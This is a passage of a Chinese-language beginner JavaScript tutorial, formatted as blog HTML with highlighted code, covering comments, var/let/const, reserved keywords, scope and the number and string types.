<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单行注释示例</span></span><br><span class="line"><span class="comment">// 计算两个数的和</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b; <span class="comment">// 返回a和b的和</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多行注释示例</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 函数：calculateAverage</span></span><br><span class="line"><span class="comment"> * 用途：计算数组中所有元素的平均值</span></span><br><span class="line"><span class="comment"> * 参数：</span></span><br><span class="line"><span class="comment"> *   numbers - 数字数组</span></span><br><span class="line"><span class="comment"> * 返回值：</span></span><br><span class="line"><span class="comment"> *   平均值（如果数组为空，返回0）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">calculateAverage</span>(<span class="params">numbers</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (numbers.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; numbers.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        sum += numbers[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sum / numbers.<span class="property">length</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 临时禁用代码</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">exampleFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;这段代码会执行&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    console.log(&quot;这段代码被注释了，不会执行&quot;);</span></span><br><span class="line"><span class="comment">    var temp = &quot;临时变量&quot;;</span></span><br><span class="line"><span class="comment">    console.log(temp);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 也可以用单行注释禁用单行代码</span></span><br><span class="line">    <span class="comment">// console.log(&quot;这行也被禁用了&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 文档注释（JSDoc风格）</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建一个用户对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">name</span> - 用户名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; <span class="variable">age</span> - 用户年龄</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> &#123;<span class="type">object</span>&#125; 包含用户信息的对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createUser</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">name</span>: name,</span><br><span class="line">        <span class="attr">age</span>: age,</span><br><span class="line">        <span class="attr">greet</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你好，&quot;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：多行注释不能嵌套</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">   这是外层注释</span></span><br><span class="line"><span class="comment">   /* </span></span><br><span class="line"><span class="comment">      这是内层注释 - 会导致语法错误</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<h2 id="5-变量"><a href="#5-变量" class="headerlink" title="5. 变量"></a>5. 变量</h2><p><strong>详细解释</strong></p>
<ul>
<li><strong>变量</strong>：用于存储信息的”容器”</li>
<li><strong>命名规则</strong>：<ul>
<li>只能包含字母、数字、下划线和美元符号</li>
<li>不能以数字开头</li>
<li>区分大小写</li>
<li>不能使用JavaScript保留关键字</li>
</ul>
</li>
<li><strong>声明方式</strong>：<ul>
<li><code>var</code>：ES5及之前，函数作用域</li>
<li><code>let</code>：ES6，块级作用域，可重新赋值</li>
<li><code>const</code>：ES6，块级作用域，不可重新赋值</li>
</ul>
</li>
</ul>
<p><strong>示例</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// var 声明（函数作用域）</span></span><br><span class="line"><span class="keyword">var</span> globalVar = <span class="string">&quot;全局变量&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">testVar</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> functionVar = <span class="string">&quot;函数内变量&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> blockVar = <span class="string">&quot;块级变量&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(blockVar); <span class="comment">// 可以访问，因为var没有块级作用域</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">testVar</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(globalVar); <span class="comment">// 可以访问</span></span><br><span class="line"><span class="comment">// console.log(functionVar); // 错误：functionVar is not defined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// let 声明（块级作用域）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">testLet</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> functionLet = <span class="string">&quot;函数内变量&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> blockLet = <span class="string">&quot;块级变量&quot;</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(blockLet); <span class="comment">// 可以访问</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// console.log(blockLet); // 错误：blockLet is not defined</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">testLet</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// const 声明（常量）</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.14159</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">USER</span> = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">25</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本数据类型不可变</span></span><br><span class="line"><span class="comment">// PI = 3.14; // 错误：Assignment to constant variable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象属性可以修改</span></span><br><span class="line"><span class="variable constant_">USER</span>.<span class="property">age</span> = <span class="number">26</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">USER</span>); <span class="comment">// &#123; name: &quot;张三&quot;, age: 26 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明变量并赋值</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> c = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多变量声明</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>, y = <span class="number">2</span>, z = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">let</span> m = <span class="number">4</span>, n = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> p = <span class="number">6</span>, q = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 未初始化的变量</span></span><br><span class="line"><span class="keyword">var</span> uninitialized;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(uninitialized); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 变量提升示例</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hoistedVar); <span class="comment">// undefined（变量提升，但未初始化）</span></span><br><span class="line"><span class="keyword">var</span> hoistedVar = <span class="string">&quot;我被提升了&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(notHoistedLet); // 错误：Cannot access &#x27;notHoistedLet&#x27; before initialization</span></span><br><span class="line"><span class="keyword">let</span> notHoistedLet = <span class="string">&quot;我不会被提升&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="6-JavaScript保留关键字"><a href="#6-JavaScript保留关键字" class="headerlink" title="6. JavaScript保留关键字"></a>6. JavaScript保留关键字</h2><p><strong>详细解释</strong></p>
<ul>
<li><strong>保留关键字</strong>：JavaScript中保留的特殊单词，不能用作变量名、函数名或标签名</li>
<li><strong>原因</strong>：这些关键字可能在当前或未来版本中具有特殊含义</li>
<li><strong>重要性</strong>：使用保留关键字会导致语法错误</li>
</ul>
<p><strong>常见保留关键字</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abstract, arguments, boolean, break, byte, case, catch, char, class, const, continue, </span><br><span class="line">debugger, default, delete, do, double, else, enum, eval, export, extends, false, final, </span><br><span class="line">finally, float, for, function, goto, if, implements, import, in, instanceof, int, interface, </span><br><span class="line">let, long, native, new, null, package, private, protected, public, return, short, static, </span><br><span class="line">super, switch, synchronized, this, throw, throws, transient, true, try, typeof, var, void, </span><br><span class="line">volatile, while, with, yield</span><br></pre></td></tr></table></figure>

<p><strong>示例</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 错误示例：使用保留关键字作为变量名</span></span><br><span class="line"><span class="comment">// var function = &quot;test&quot;; // 语法错误</span></span><br><span class="line"><span class="comment">// var class = &quot;math&quot;; // 语法错误</span></span><br><span class="line"><span class="comment">// var const = 10; // 语法错误</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确示例：避免使用保留关键字</span></span><br><span class="line"><span class="keyword">var</span> funcName = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> className = <span class="string">&quot;math&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> constantValue = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用保留关键字作为对象属性（ES6+允许）</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">function</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="attr">class</span>: <span class="string">&quot;math&quot;</span>,</span><br><span class="line">    <span class="attr">const</span>: <span class="number">10</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">function</span>); <span class="comment">// &quot;test&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留关键字在特定上下文中可用</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">example</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable language_">arguments</span> = <span class="string">&quot;local&quot;</span>; <span class="comment">// 不推荐，会覆盖函数的arguments对象</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>); <span class="comment">// &quot;local&quot; 而不是参数对象</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">example</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 未来保留关键字（可能在将来版本中使用）</span></span><br><span class="line"><span class="comment">// var let = 5; // 在ES6+中是语法错误</span></span><br><span class="line"><span class="comment">// var yield = 10; // 在ES6+中是语法错误</span></span><br></pre></td></tr></table></figure>

<h2 id="7-JavaScript作用域"><a href="#7-JavaScript作用域" class="headerlink" title="7. JavaScript作用域"></a>7. JavaScript作用域</h2><h3 id="7-1-局部变量"><a href="#7-1-局部变量" class="headerlink" title="7.1 局部变量"></a>7.1 局部变量</h3><p><strong>详细解释：</strong></p>
<ul>
<li><strong>定义</strong>：在函数内部声明的变量</li>
<li><strong>作用域</strong>：仅在声明它的函数内部可访问</li>
<li><strong>生命周期</strong>：函数调用开始时创建，函数执行结束时销毁</li>
<li><strong>特点</strong>：每次函数调用都会创建新的局部变量</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">calculate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 局部变量</span></span><br><span class="line">    <span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.14</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// i也是局部变量（块级作用域）</span></span><br><span class="line">        sum += i;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    result = sum * <span class="variable constant_">PI</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;i:&quot;</span>, i); <span class="comment">// 错误：i is not defined（i只在for循环块内有效）</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sum:&quot;</span>, sum); <span class="comment">// 45</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>, result); <span class="comment">// 141.3</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">calculate</span>();</span><br><span class="line"><span class="comment">// console.log(result); // 错误：result is not defined</span></span><br><span class="line"><span class="comment">// console.log(sum); // 错误：sum is not defined</span></span><br><span class="line"><span class="comment">// console.log(PI); // 错误：PI is not defined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 局部变量与全局变量同名</span></span><br><span class="line"><span class="keyword">var</span> message = <span class="string">&quot;全局消息&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showMessage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> message = <span class="string">&quot;局部消息&quot;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(message); <span class="comment">// &quot;局部消息&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">showMessage</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(message); <span class="comment">// &quot;全局消息&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数参数也是局部变量</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你好，&quot;</span> + name + <span class="string">&quot;！&quot;</span>);</span><br><span class="line">    name = <span class="string">&quot;修改后的&quot;</span> + name;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;修改后：&quot;</span> + name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">greet</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line"><span class="comment">// console.log(name); // 错误：name is not defined</span></span><br></pre></td></tr></table></figure>

<h3 id="7-2-全局变量"><a href="#7-2-全局变量" class="headerlink" title="7.2 全局变量"></a>7.2 全局变量</h3><p><strong>详细解释：</strong></p>
<ul>
<li><strong>定义</strong>：在函数外部声明的变量，或未使用<code>var</code>&#x2F;<code>let</code>&#x2F;<code>const</code>声明的变量</li>
<li><strong>作用域</strong>：在整个程序中可访问</li>
<li><strong>生命周期</strong>：从声明开始直到页面关闭</li>
<li><strong>特点</strong>：容易造成命名冲突，应谨慎使用</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全局变量声明</span></span><br><span class="line"><span class="keyword">var</span> globalVar = <span class="string">&quot;全局变量&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> globalLet = <span class="string">&quot;全局let变量&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">GLOBAL_CONST</span> = <span class="string">&quot;全局常量&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">testScope</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(globalVar); <span class="comment">// &quot;全局变量&quot;</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(globalLet); <span class="comment">// &quot;全局let变量&quot;</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">GLOBAL_CONST</span>); <span class="comment">// &quot;全局常量&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 修改全局变量</span></span><br><span class="line">    globalVar = <span class="string">&quot;修改后的全局变量&quot;</span>;</span><br><span class="line">    globalLet = <span class="string">&quot;修改后的全局let变量&quot;</span>;</span><br><span class="line">    <span class="comment">// GLOBAL_CONST = &quot;修改&quot;; // 错误：Assignment to constant variable</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">testScope</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(globalVar); <span class="comment">// &quot;修改后的全局变量&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(globalLet); <span class="comment">// &quot;修改后的全局let变量&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 未声明的变量会成为全局变量（不推荐）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createGlobal</span>(<span class="params"></span>) &#123;</span><br><span class="line">    undeclaredVar = <span class="string">&quot;我是全局变量&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">createGlobal</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(undeclaredVar); <span class="comment">// &quot;我是全局变量&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局对象属性</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">myGlobal</span> = <span class="string">&quot;通过window对象创建的全局变量&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(myGlobal); <span class="comment">// &quot;通过window对象创建的全局变量&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局变量与局部变量同名</span></span><br><span class="line"><span class="keyword">var</span> conflict = <span class="string">&quot;全局&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">conflictExample</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> conflict = <span class="string">&quot;局部&quot;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(conflict); <span class="comment">// &quot;局部&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">conflictExample</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(conflict); <span class="comment">// &quot;全局&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 避免全局变量污染的IIFE模式</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> privateVar = <span class="string">&quot;私有变量&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">privateFunc</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;私有函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 暴露公共接口</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">PublicAPI</span> = &#123;</span><br><span class="line">        <span class="attr">publicMethod</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;公共方法&quot;</span>);</span><br><span class="line">            <span class="title function_">privateFunc</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(privateVar); // 错误：privateVar is not defined</span></span><br><span class="line"><span class="title class_">PublicAPI</span>.<span class="title function_">publicMethod</span>(); <span class="comment">// &quot;公共方法&quot; + &quot;私有函数&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="8-数据类型"><a href="#8-数据类型" class="headerlink" title="8. 数据类型"></a>8. 数据类型</h2><h3 id="8-1-基本数据类型"><a href="#8-1-基本数据类型" class="headerlink" title="8.1 基本数据类型"></a>8.1 基本数据类型</h3><h4 id="8-1-1-数值型（Number）"><a href="#8-1-1-数值型（Number）" class="headerlink" title="8.1.1 数值型（Number）"></a>8.1.1 数值型（Number）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>所有数字都是<code>number</code>类型，不分整数和浮点数</li>
<li>支持十进制、八进制、十六进制表示法</li>
<li>特殊值：<code>NaN</code>（非数字）、<code>Infinity</code>（无穷大）</li>
<li>最大安全整数：<code>Number.MAX_SAFE_INTEGER</code>（2^53 - 1）</li>
<li>最小安全整数：<code>Number.MIN_SAFE_INTEGER</code>（-(2^53 - 1)）</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 十进制</span></span><br><span class="line"><span class="keyword">var</span> decimal = <span class="number">42</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> decimal); <span class="comment">// &quot;number&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数</span></span><br><span class="line"><span class="keyword">var</span> float = <span class="number">3.14159</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> float); <span class="comment">// &quot;number&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 科学计数法</span></span><br><span class="line"><span class="keyword">var</span> scientific = <span class="number">1.23e5</span>; <span class="comment">// 123000</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(scientific); <span class="comment">// 123000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 八进制（以0开头，ES5严格模式下无效）</span></span><br><span class="line"><span class="keyword">var</span> octal = <span class="number">0755</span>; <span class="comment">// 493</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(octal); <span class="comment">// 493</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 十六进制（以0x开头）</span></span><br><span class="line"><span class="keyword">var</span> hex = <span class="number">0xFF</span>; <span class="comment">// 255</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hex); <span class="comment">// 255</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 二进制（ES6+，以0b开头）</span></span><br><span class="line"><span class="keyword">var</span> binary = <span class="number">0b1010</span>; <span class="comment">// 10</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(binary); <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 特殊值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0</span> / <span class="number">0</span>); <span class="comment">// NaN</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span> / <span class="number">0</span>); <span class="comment">// Infinity</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(-<span class="number">1</span> / <span class="number">0</span>); <span class="comment">// -Infinity</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测NaN</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">isNaN</span>(<span class="title class_">NaN</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">isNaN</span>(<span class="string">&quot;abc&quot;</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">isNaN</span>(<span class="number">123</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测有限数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">isFinite</span>(<span class="number">123</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">isFinite</span>(<span class="title class_">Infinity</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换为数字</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseInt</span>(<span class="string">&quot;123&quot;</span>)); <span class="comment">// 123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseInt</span>(<span class="string">&quot;123.45&quot;</span>)); <span class="comment">// 123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseInt</span>(<span class="string">&quot;abc123&quot;</span>)); <span class="comment">// NaN</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseInt</span>(<span class="string">&quot;123abc&quot;</span>)); <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseFloat</span>(<span class="string">&quot;123.45&quot;</span>)); <span class="comment">// 123.45</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseFloat</span>(<span class="string">&quot;123&quot;</span>)); <span class="comment">// 123</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数字方法</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">123.456</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num.<span class="title function_">toFixed</span>(<span class="number">2</span>)); <span class="comment">// &quot;123.46&quot;（保留2位小数）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num.<span class="title function_">toPrecision</span>(<span class="number">4</span>)); <span class="comment">// &quot;123.5&quot;（保留4位有效数字）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num.<span class="title function_">toString</span>()); <span class="comment">// &quot;123.456&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num.<span class="title function_">toString</span>(<span class="number">16</span>)); <span class="comment">// &quot;7b.74bc6a7ef9db2&quot;（十六进制表示）</span></span><br></pre></td></tr></table></figure>

<h4 id="8-1-2-字符串型（String）"><a href="#8-1-2-字符串型（String）" class="headerlink" title="8.1.2 字符串型（String）"></a>8.1.2 字符串型（String）</h4><p><strong>详细解释：</strong></p>
<ul>
<li>用单引号或双引号包裹的文本</li>
<li>字符串是不可变的（修改会创建新字符串）</li>
<li>支持转义字符（如<code>\n</code>、<code>\t</code>）</li>
<li>模板字符串（ES6+）：使用反引号（&#96;）创建，支持多行和变量插值</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单引号和双引号</span></span><br><span class="line"><span class="keyword">var</span> single = <span class="string">&#x27;单引号字符串&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> double = <span class="string">&quot;双引号字符串&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> single); <span class="comment">// &quot;string&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> double); <span class="comment">// &quot;string&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转义字符</span></span><br><span class="line"><span class="keyword">var</span> escaped = <span class="string">&quot;第一行\n第二行\t制表符&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(escaped);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模板字符串（ES6+）</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">var</span> template = <span class="string">`你好，<span class="subst">$&#123;name&#125;</span>！你今年<span class="subst">$&#123;age&#125;</span>岁。`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(template); <span class="comment">// &quot;你好，张三！你今年25岁。&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多行字符串</span></span><br><span class="line"><span class="keyword">var</span> multiLine = <span class="string">`这是第一行</span></span><br><span class="line"><span class="string">这是第二行</span></span><br><span class="line"><span class="string">这是第三行`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(multiLine);</span><br><span 